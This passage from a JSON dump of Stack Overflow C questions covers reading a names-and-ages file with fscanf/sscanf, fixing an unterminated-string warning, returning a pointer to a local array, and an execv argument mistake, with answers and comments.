<em>line-oriented</em> input (<code>fgets</code> and then parse your data with either <code>strtok</code> or <code>sscanf</code>). However, this case qualifies.</p>\n\n<p>Here is a short example of using a struct to hold the data and <code>fscanf</code> for the input:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#define MAXP 20\n\ntypedef struct {\n    char first[20];\n    char last[20];\n    int age;\n} person;\n\nint main (int argc, char **argv) {\n\n    size_t i, idx = 0;              /* initialize all variables */\n    person p[MAXP] = {{\"\", \"\", 0}};\n    FILE *fp = argc &gt; 1 ? fopen(argv[1], \"r\") : stdin;\n\n    if (!fp) {\n        fprintf (stderr, \"error: file open failed '%s'.\\n\", argv[1]);\n        return 1;\n    }\n\n    while (idx &lt; MAXP &amp;&amp;    /* read each line, separate first, last, age */\n        fscanf (fp, \"%[^,],%s%d%*c\", p[idx].last, p[idx].first, &amp;p[idx].age) == 3)\n        idx++;\n\n    if (fp != stdin) fclose (fp);   /* close file  */\n\n    for (i = 0; i &lt; idx; i++)       /* output data */\n        printf (\" p[%2zu] '%s %s' is %d years old.\\n\",\n                i, p[i].first, p[i].last, p[i].age);\n\n    return 0;\n}\n</code></pre>\n\n<p><strong>Input File</strong></p>\n\n<pre><code>$ cat dat/names.txt\nRyan, Elizabeth     62\nMcIntyre, Osborne   84\nDuMond, Kristin     18\nLarson, Lois        42\nThorpe, Trinity     15\nRuiz, Pedro         35\nAli, Mohammed       60\nVashti, Indura      20\n</code></pre>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>$ ./bin/person &lt;dat/names.txt\n p[ 0] 'Elizabeth Ryan' is 62 years old.\n p[ 1] 'Osborne McIntyre' is 84 years old.\n p[ 2] 'Kristin DuMond' is 18 years old.\n p[ 3] 'Lois Larson' is 42 years old.\n p[ 4] 'Trinity Thorpe' is 15 years old.\n p[ 5] 'Pedro Ruiz' is 35 years old.\n p[ 6] 'Mohammed Ali' is 60 years old.\n p[ 7] 'Indura Vashti' is 20 years old.\n</code></pre>\n\n<p><strong>Example Using fgets/sscanf</strong></p>\n\n<p>You can essentially do the same thing with <code>fgets</code> and <code>sscanf</code>. Here is a short example using that combination:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nenum { MAXP = 20, MAXC = 128 };\n\ntypedef struct {\n    char first[20];\n    char last[20];\n    int age;\n} person;\n\nint main (int argc, char **argv) {\n\n    size_t i, idx = 0;              /* initialize all variables */\n    char buf[MAXC] = \"\";\n    person p[MAXP] = {{\"\", \"\", 0}};\n    FILE *fp = argc &gt; 1 ? fopen(argv[1], \"r\") : stdin;\n\n    if (!fp) {\n        fprintf (stderr, \"error: file open failed '%s'.\\n\", argv[1]);\n        return 1;\n    }\n\n    while (idx &lt; MAXP &amp;&amp; fgets (buf, MAXC, fp) &amp;&amp; \n           sscanf (buf, \"%[^,],%s%d\", \n                   p[idx].last, p[idx].first, &amp;p[idx].age) == 3)\n        idx++;\n\n    if (fp != stdin) fclose (fp);   /* close file  */\n\n    for (i = 0; i &lt; idx; i++)       /* output data */\n        printf (\" p[%2zu] '%s %s' is %d years old.\\n\",\n                i, p[i].first, p[i].last, p[i].age);\n\n    return 0;\n}\n</code></pre>\n\n<p>Look it over and let me know if you have any questions.</p>\n"}, {"tags": [], "owner": {"reputation": 11698, "user_id": 5399734, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/2162d669508364bb0c03aba1a2473aa8?s=128&d=identicon&r=PG&f=1", "display_name": "nalzok", "link": "https://stackoverflow.com/users/5399734/nalzok"}, "is_accepted": true, "score": 0, "last_activity_date": 1459383019, "last_edit_date": 1459383019, "creation_date": 1459379952, "answer_id": 36321446, "question_id": 36319712, "link": "https://stackoverflow.com/questions/36319712/how-to-scan-txt-file-for-data-and-store-in-arrays-in-c/36321446#36321446", "title": "How to scan txt file for data and store in arrays in C?", "body": "<p>No matter how many people the file contains, 30 people are to be printed out. In your case, where that file only contains 8 people, the values hold by the remaining 22 lines(from <code>line[8]</code> to <code>line[29]</code>) are garbage values, because they are never initialised. As a result, strange characters are printed out.</p>\n\n<p>Here is the refined code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, char *argv[])\n{\n    char first[100][40], last[100][40];\n    int age[100];\n    size_t i = 0;\n    FILE *file = fopen(argv[1], \"r\");\n\n    if(!file) {\n        printf(\"Could not open file. Exiting application.\");\n        return 1;\n    }\n\n    while(fscanf(file, \" %[^,],%s%d\", first[i], last[i], &amp;age[i]) == 3)\n    {\n        i++;\n    }\n\n    size_t num = i;\n\n    fclose(file);\n\n    for (i = 0; i &lt; num; i++)\n        printf(\"%s, %s\\t%d\\n\", first[i], last[i], age[i]);\n\n    return 0;\n}\n</code></pre>\n\n<p>In fact, you don't need to read in a whole line first. Instead, scan the expected data from the file directly.</p>\n"}], "owner": {"reputation": 15, "user_id": 6136873, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c748fde0312929a91e1d18dbdbb78574?s=128&d=identicon&r=PG&f=1", "display_name": "schintha", "link": "https://stackoverflow.com/users/6136873/schintha"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2402, "favorite_count": 0, "accepted_answer_id": 36321446, "answer_count": 3, "score": -1, "last_activity_date": 1459383019, "creation_date": 1459371877, "last_edit_date": 1459378667, "question_id": 36319712, "link": "https://stackoverflow.com/questions/36319712/how-to-scan-txt-file-for-data-and-store-in-arrays-in-c", "title": "How to scan txt file for data and store in arrays in C?", "body": "<p>I'm trying to read a text file containing both strings and numbers and save into their respective arrays. This is the contents text file I'm trying to read</p>\n\n<pre><code>Ryan, Elizabeth     62\nMcIntyre, Osborne   84\nDuMond, Kristin     18\nLarson, Lois        42\nThorpe, Trinity     15\nRuiz, Pedro         35\nAli, Mohammed       60\nVashti, Indura      20\n</code></pre>\n\n<p>I need to save the last name, first name and the age of the repescitve person in parallel arrays. (so I need to discard the comma when reading).\nThis is what I have so far.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, char *argv[])\n{\n    char line[100][41];\n    char junk[100];\n    int i;\n    FILE *file = fopen(argv[1], \"r\");\n\n    if(!file) {\n        printf(\"Could not open file. Exiting application.\");\n        return 1;\n    }\n\n    for(i=0; i&lt;100; i++)\n    {\n        fscanf(file, \"%[^\\n]\", line[i]); //Get text\n        fscanf(file,\"%[ \\n\\t\\r]s\",junk); //Remove any 'white space' characters\n    }\n\n    fclose(file);\n\n    for (i=0; i&lt;30; i++)\n        printf(\"%s\\n\",line[i]);\n\n    return 0;\n}\n</code></pre>\n\n<p>I've passed the file argument in IDE. I get a lot of special characters at the end of output.</p>\n\n<pre><code>Ryan, Elizabeth         62\nMcIntyre, Osborne       84\nDuMond, Kristin         18\nLarson, Lois            42\nThorpe, Trinity         15\nRuiz, Pedro             35\nAli, Mohammed           60\nVashti, Indura          20\n\u250c\n\n\u00a0t\u2560\u2560\n\n$\n\nM\n\nv\n9 R\u00ec\nx\u00e1\n\n\u255a\n\n\u00b1\nt/\u2557\u20a78\n\u00bf\u2261`\n\u00a0\u00a0\u00a0Tq\u00a0t\u00f6q\u00a0t4\u2264`\n\n\n\u00ffv\nh((((                  H\u00e4\u00e4\u00e4\u00e4\u00e4\u00e4\u00e4\u00e4\u00e4\u00e4\u00fc\u00fc\u00fc\u00fc\u00fc\u00fc\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9 \n</code></pre>\n\n<p>Why am I reading all those special characters? And how can I discard the comma and save into three different arrays?</p>\n"}, {"tags": ["c", "fxcop"], "comments": [{"owner": {"reputation": 2303, "user_id": 2175231, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4I57P.png?s=128&g=1", "display_name": "Wasabi", "link": "https://stackoverflow.com/users/2175231/wasabi"}, "reply_to_user": {"reputation": 6975, "user_id": 3121023, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f52448806175b9aa66c86d40cf0829f1?s=128&d=identicon&r=PG&f=1", "display_name": "user3121023", "link": "https://stackoverflow.com/users/3121023/user3121023"}, "edited": false, "score": 0, "creation_date": 1459371502, "post_id": 36319506, "comment_id": 60262504, "body": "@user3121023 I&#39;m compiling now with that test (it takes a while), but even if that works, it isn&#39;t a really extensible solution, especially if there&#39;s a case where <code>label</code> is dynamically allocated."}], "answers": [{"tags": [], "owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "is_accepted": true, "score": 3, "last_activity_date": 1459372512, "creation_date": 1459372512, "answer_id": 36319894, "question_id": 36319506, "link": "https://stackoverflow.com/questions/36319506/removing-c6054-error-with-scanf-functions/36319894#36319894", "title": "Removing C6054 error with scanf functions", "body": "<p>If scanf fails the buffer remains uninitialized. User may enter more than 32 characters writing out-of-bounds. In either case the buffer will not be null terminated.</p>\n\n<p>First initialize the buffer correctly: </p>\n\n<pre><code>char label[32] = { 0 };\n</code></pre>\n\n<p>then make sure you read at most 31 characters and check the return value of the call:</p>\n\n<pre><code>const int read = fscanf( fd , \"%31s\" , label );\nif( read &lt;= 0 )\n{\n    //didn't read anything, check feof and ferror\n}\n</code></pre>\n"}], "owner": {"reputation": 2303, "user_id": 2175231, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4I57P.png?s=128&g=1", "display_name": "Wasabi", "link": "https://stackoverflow.com/users/2175231/wasabi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2376, "favorite_count": 0, "accepted_answer_id": 36319894, "answer_count": 1, "score": 3, "last_activity_date": 1459372512, "creation_date": 1459371240, "last_edit_date": 1459371603, "question_id": 36319506, "link": "https://stackoverflow.com/questions/36319506/removing-c6054-error-with-scanf-functions", "title": "Removing C6054 error with scanf functions", "body": "<p>I am using Code Analysis (aka FxCop) on VS2012 and I have a few functions of the form</p>\n\n<pre><code>void ReadTable(FILE *fd)\n{\n    char label[32];\n    /* ... */\n    fscanf(fd, \"%s\", label);\n    /* ... */\n    if (strcmp(label, \"TEST\") == 0)\n    {\n        /* ... */\n    }\n}\n</code></pre>\n\n<p>These always throw <code>warning C6054: String 'label' might not be zero-terminated.</code> I understand why this happens, since they can't use SAL annotations to indicate the output from <code>fscanf</code> will be null-terminated, but the fact remains.</p>\n\n<p>Is there a way to get rid of this warning (without disabling the relevant Code Analysis check wholesale)? Or is it something I just have to live with when using <code>scanf</code>?</p>\n"}, {"tags": ["c", "malloc", "free", "strlen"], "comments": [{"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1459371173, "post_id": 36319423, "comment_id": 60262297, "body": "Be handy to see the code for <code>itoba</code>"}, {"owner": {"reputation": 71, "user_id": 3541216, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c1d839dfdfd2d4882ce54928db5ed8e2?s=128&d=identicon&r=PG&f=1", "display_name": "Dani", "link": "https://stackoverflow.com/users/3541216/dani"}, "reply_to_user": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1459371278, "post_id": 36319423, "comment_id": 60262354, "body": "I added the code itoba"}, {"owner": {"reputation": 25589, "user_id": 15727, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FFivc.jpg?s=128&g=1", "display_name": "Thomas Padron-McCarthy", "link": "https://stackoverflow.com/users/15727/thomas-padron-mccarthy"}, "edited": false, "score": 2, "creation_date": 1459371298, "post_id": 36319423, "comment_id": 60262364, "body": "<code>return temp;</code> returns a pointer to a local variable, which disappears when the function exits."}, {"owner": {"reputation": 21714, "user_id": 1392132, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/QF6FZ.jpg?s=128&g=1", "display_name": "5gon12eder", "link": "https://stackoverflow.com/users/1392132/5gon12eder"}, "edited": false, "score": 1, "creation_date": 1459371342, "post_id": 36319423, "comment_id": 60262399, "body": "Did you compile with warnings enabled?"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1459371366, "post_id": 36319423, "comment_id": 60262421, "body": "You leak the memory allocated on your first 2 lines, you call <code>free</code> on local buffer <code>temp</code> which doesn&#39;t even exist at that point..."}, {"owner": {"reputation": 71, "user_id": 3541216, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c1d839dfdfd2d4882ce54928db5ed8e2?s=128&d=identicon&r=PG&f=1", "display_name": "Dani", "link": "https://stackoverflow.com/users/3541216/dani"}, "edited": false, "score": 0, "creation_date": 1459371465, "post_id": 36319423, "comment_id": 60262483, "body": "so because temp is not a pointer and StudIDcpy is getting its address so i dont need to allocate memory for it? and also dont need to free it?"}, {"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1459371607, "post_id": 36319423, "comment_id": 60262559, "body": "<code>temp</code> is on the stack. That disappears at the end of the function. So the pointer is no longer valid"}, {"owner": {"reputation": 55871, "user_id": 10077, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/be4e820c7af6f3b79cf055d984cda7ff?s=128&d=identicon&r=PG", "display_name": "Fred Larson", "link": "https://stackoverflow.com/users/10077/fred-larson"}, "edited": false, "score": 0, "creation_date": 1459371612, "post_id": 36319423, "comment_id": 60262563, "body": "And FYI, <code>sizeof(char)</code> is 1 by definition."}, {"owner": {"reputation": 310760, "user_id": 12711, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c330bdee507c95c603a93ca91d9145a9?s=128&d=identicon&r=PG", "display_name": "Michael Burr", "link": "https://stackoverflow.com/users/12711/michael-burr"}, "edited": false, "score": 0, "creation_date": 1459371797, "post_id": 36319423, "comment_id": 60262665, "body": "See this famous Stackoverflow question/answer: <a href=\"http://stackoverflow.com/q/6441218/12711\">stackoverflow.com/q/6441218/12711</a>"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 1, "creation_date": 1459371824, "post_id": 36319423, "comment_id": 60262682, "body": "@tikanti-man <code>char temp[15];</code> allocates memory, and the memory is automatically freed when the function returns. You cannot write <code>strcpy(StudID, StudIDcpy);</code> because <code>StudIDcpy</code> is pointing to memory that has already been freed."}, {"owner": {"reputation": 71, "user_id": 3541216, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c1d839dfdfd2d4882ce54928db5ed8e2?s=128&d=identicon&r=PG&f=1", "display_name": "Dani", "link": "https://stackoverflow.com/users/3541216/dani"}, "edited": false, "score": 0, "creation_date": 1459372248, "post_id": 36319423, "comment_id": 60262907, "body": "COOL!!! i understand... now i need to think of a different way to make my code work... thanks for the help!"}, {"owner": {"reputation": 71, "user_id": 3541216, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c1d839dfdfd2d4882ce54928db5ed8e2?s=128&d=identicon&r=PG&f=1", "display_name": "Dani", "link": "https://stackoverflow.com/users/3541216/dani"}, "edited": false, "score": 0, "creation_date": 1459372297, "post_id": 36319423, "comment_id": 60262935, "body": "What if i used *temp instead of temp[15]???"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1459373155, "post_id": 36319423, "comment_id": 60263375, "body": "that&#39;s ok but the <code>malloc</code> should be for the <code>temp</code>"}, {"owner": {"reputation": 71, "user_id": 3541216, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c1d839dfdfd2d4882ce54928db5ed8e2?s=128&d=identicon&r=PG&f=1", "display_name": "Dani", "link": "https://stackoverflow.com/users/3541216/dani"}, "edited": false, "score": 0, "creation_date": 1459373353, "post_id": 36319423, "comment_id": 60263478, "body": "I changed the &#39;char *itoba(int a)&#39; to &#39;void itoba(int a,char *temp)&#39; I think this is the best way to go..."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1459375116, "post_id": 36319423, "comment_id": 60264284, "body": "OK but you should also supply length as argument, otherwise the function has no way of avoiding a buffer overflow"}, {"owner": {"reputation": 71, "user_id": 3541216, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c1d839dfdfd2d4882ce54928db5ed8e2?s=128&d=identicon&r=PG&f=1", "display_name": "Dani", "link": "https://stackoverflow.com/users/3541216/dani"}, "edited": false, "score": 0, "creation_date": 1459375340, "post_id": 36319423, "comment_id": 60264386, "body": "length of what? what would i do with hit? (by the way thank you very much for your help :) )"}, {"owner": {"reputation": 71, "user_id": 3541216, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c1d839dfdfd2d4882ce54928db5ed8e2?s=128&d=identicon&r=PG&f=1", "display_name": "Dani", "link": "https://stackoverflow.com/users/3541216/dani"}, "edited": false, "score": 0, "creation_date": 1459411639, "post_id": 36319423, "comment_id": 60277634, "body": "I made sure the integer send to the function is not longer then a 4 digit number, so maximum string value could be 14 zeros or ones... so there could not be a buffer overflow. but thanks for your help."}], "answers": [{"tags": [], "owner": {"reputation": 11698, "user_id": 5399734, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/2162d669508364bb0c03aba1a2473aa8?s=128&d=identicon&r=PG&f=1", "display_name": "nalzok", "link": "https://stackoverflow.com/users/5399734/nalzok"}, "is_accepted": true, "score": 1, "last_activity_date": 1459386884, "last_edit_date": 1459386884, "creation_date": 1459386533, "answer_id": 36322482, "question_id": 36319423, "link": "https://stackoverflow.com/questions/36319423/strlen-and-free-memory/36322482#36322482", "title": "strlen and free memory", "body": "<p>In your <code>itoba()</code> function, <code>temp</code>, a local array, which decays to a pointer to local variables, is returned.</p>\n\n<p>After a function returns, its local variables are \"free\"ed immediately, allowing these memory space to be reused by someone else. Consequently, values held by them will soon be overridden by other values on the stack.</p>\n\n<p>You can rewrite <code>itoba()</code> like this:</p>\n\n<pre><code>char *itoba(int a)\n{\n    int i = 0, j;\n    char *temp = malloc(15); // &lt;--- This line is different\n    while(a){\n        if (a % 2)\n            temp[i] = '1';\n        else\n            temp[i] = '0';\n        i++;\n        a = a / 2;\n    }\n    temp[i] = '\\0';\n    for (j = 0; j &lt; i / 2; j++)\n        swapc(&amp;temp[j], &amp;temp[i - j -1]);\n    return temp;\n}\n</code></pre>\n\n<p>BTW: You should remove <code>char *StudIDcpy = (char*)malloc(sizeof(char) * 15);</code>, because the pointer value returned by <code>malloc()</code> is later discarded by <code>itoba(IDtemp);</code>. As a result, the memory allocated to <code>StudIDcpy</code> by this <code>malloc()</code> will never be freed, causing memory leak.</p>\n"}], "owner": {"reputation": 71, "user_id": 3541216, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c1d839dfdfd2d4882ce54928db5ed8e2?s=128&d=identicon&r=PG&f=1", "display_name": "Dani", "link": "https://stackoverflow.com/users/3541216/dani"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 394, "favorite_count": 0, "closed_date": 1459416791, "accepted_answer_id": 36322482, "answer_count": 1, "score": -5, "last_activity_date": 1465321825, "creation_date": 1459371010, "last_edit_date": 1465321825, "question_id": 36319423, "link": "https://stackoverflow.com/questions/36319423/strlen-and-free-memory", "closed_reason": "Not suitable for this site", "title": "strlen and free memory", "body": "<p>I allocated memory to a pointer to the maximum size of characters it could have.\nThen I had to write code that will change its values depending on the value that was read from the file and I needed to know what is the length of the value in the pointer, so I used <code>strlen()</code> function.</p>\n\n<p>I got what I needed.\nThe problem occured when I tried to free the memory of that pointer. The program crashed, I'm assuming im doing something \"ilegal\" and would like to know why and how to fix it.</p>\n\n<p>here is part of the code:</p>\n\n<pre><code>char *StudID = (char*)malloc(sizeof(char)*15);\nchar *StudIDcpy = (char*)malloc(sizeof(char) * 15);\nfread(stud[i].ID, sizeof(char), 4, in);\nstud[i].ID[4] = '\\0';\nIDtemp = atoi(stud[i].ID);//convert ID string to integer and store value in IDtemp\nStudIDcpy = itoba(IDtemp);//convert integer to binary number as a string\nstrcpy(StudID, StudIDcpy);\nIDtemp = strlen(StudIDcpy);\nfree(StudIDcpy); // &lt;---- I BELIEVE THIS IS WHERE IT CRASHES\n</code></pre>\n\n<p>Here is my <code>itoba()</code> function:</p>\n\n<pre><code>char *itoba(int a){\n    int i = 0, j;\n    char temp[15];\n    while(a){\n        if (a % 2)temp[i] = '1';\n        else temp[i] = '0';\n        i++;\n        a = a / 2;\n    }\n    temp[i] = '\\0';\n    for (j = 0; j &lt; i / 2; j++)swapc(&amp;temp[j], &amp;temp[i - j-1]);\n    return temp;\n}\n</code></pre>\n\n<p>By the way I know I don't have to write <code>sizeof(char)</code> because it is equal to 1, but I write it anyways so I remember what value should be put there.</p>\n"}, {"tags": ["c", "bash", "execv"], "comments": [{"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 2, "creation_date": 1459371021, "post_id": 36319388, "comment_id": 60262202, "body": "<code>&quot;NULL&quot;</code>, seriously?"}, {"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "edited": false, "score": 0, "creation_date": 1459371120, "post_id": 36319388, "comment_id": 60262265, "body": "<code>1 + argc - 2</code>.  So, an array of characters that is one smaller than the number of arguments to your program."}, {"owner": {"reputation": 897, "user_id": 3830887, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9aa739aedfb6760abc3605091e12810e?s=128&d=identicon&r=PG&f=1", "display_name": "TonyB", "link": "https://stackoverflow.com/users/3830887/tonyb"}, "edited": false, "score": 0, "creation_date": 1459372518, "post_id": 36319388, "comment_id": 60263043, "body": "@T.Saba please see the MAJOR hint that &quot;Kerrek SB&quot; gave you... Does &quot;NULL&quot; look right...??? Should there be Quotes around it???"}, {"owner": {"reputation": 3, "user_id": 5562856, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d70ec00a2e542ca958d78fc27183df5?s=128&d=identicon&r=PG&f=1", "display_name": "Krakozia", "link": "https://stackoverflow.com/users/5562856/krakozia"}, "edited": false, "score": 0, "creation_date": 1459376753, "post_id": 36319388, "comment_id": 60264952, "body": "oh yeah indeed... don&#39;t know how i missed it...mindless mistake i made here,  thanks"}], "owner": {"reputation": 3, "user_id": 5562856, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d70ec00a2e542ca958d78fc27183df5?s=128&d=identicon&r=PG&f=1", "display_name": "Krakozia", "link": "https://stackoverflow.com/users/5562856/krakozia"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 200, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1459370873, "creation_date": 1459370873, "question_id": 36319388, "link": "https://stackoverflow.com/questions/36319388/having-some-troubles-with-execv-bash-c", "title": "having some troubles with execv (bash c)", "body": "<p>i want to write a program which executes the command passed in argument to a .c file, but i'm having incomprehensible errors coming from the declaration of an array of char pointers; my code is the following:</p>\n\n<pre><code>#include &lt;sys/types.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n\nint main(int argc, char const *argv[])\n{\n\n if(argc &lt; 2)\n {\n    printf(\"Incorrect number of arguments.\\n\");\n    return -1;\n }\n\n char* args[1 + argc - 2]; // this is causing the problem\n char cmd[10];\n /*\n * some operations...\n */\n\n char* test[] = {\"ps\",\"-l\",\"NULL\"};\n execv(\"/bin/ps\",test);\n\n return 0;\n}\n</code></pre>\n\n<p>the arguments of execv should normally be cmd and args, but it didnt work, so i tried a simple command, didnt work either, i'm getting the following error:</p>\n\n<pre><code>error: unsupported option (BSD syntax)\n\nUsage:\nps [options]\n\nTry 'ps --help &lt;simple|list|output|threads|misc|all&gt;'\n or 'ps --help &lt;s|l|o|t|m|a&gt;'\nfor additional help text.\n\nFor more details see ps(1).\n</code></pre>\n\n<p>however, if i put 1 as the size of the args array, the ps command is executed... i'm pretty confused, and i'd appreciate any kind of help </p>\n"}, {"tags": ["c", "linux", "bash", "shell", "signal-handling"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1459370954, "post_id": 36319350, "comment_id": 60262169, "body": "I really don&#39;t see anything that can be named &quot;issue&quot;. Just perform one loop iteration with empty input. Yes, you will have to rearrange stuff to avoid code duplication."}, {"owner": {"reputation": 2986, "user_id": 4564080, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/83009ae032b72f3c1aa2bba01ab123e1?s=128&d=identicon&r=PG&f=1", "display_name": "KOB", "link": "https://stackoverflow.com/users/4564080/kob"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1459371108, "post_id": 36319350, "comment_id": 60262253, "body": "@EugeneSh. That was one solution I too came up with, but I was not able to do perform a loop with no user input. How could I achieve this?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1459371222, "post_id": 36319350, "comment_id": 60262317, "body": "Take the loop content into a separate function. Or better to two - one for input, one for output. Then just call the one for output."}, {"owner": {"reputation": 2986, "user_id": 4564080, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/83009ae032b72f3c1aa2bba01ab123e1?s=128&d=identicon&r=PG&f=1", "display_name": "KOB", "link": "https://stackoverflow.com/users/4564080/kob"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1459371389, "post_id": 36319350, "comment_id": 60262437, "body": "@EugeneSh. Inside my <code>ctrl_C_handler</code> function I simply printed a new line and then called <code>my_shell_loop()</code>. This works as desired the first time ctrl+c is pressed, but then if it is pressed again, it acts as it did previously"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1459371669, "post_id": 36319350, "comment_id": 60262591, "body": "Well, after you have handled the signal once, you have to re-assign the handler again. Just put the <code>signal</code> line in the end of the handler itself"}, {"owner": {"reputation": 2986, "user_id": 4564080, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/83009ae032b72f3c1aa2bba01ab123e1?s=128&d=identicon&r=PG&f=1", "display_name": 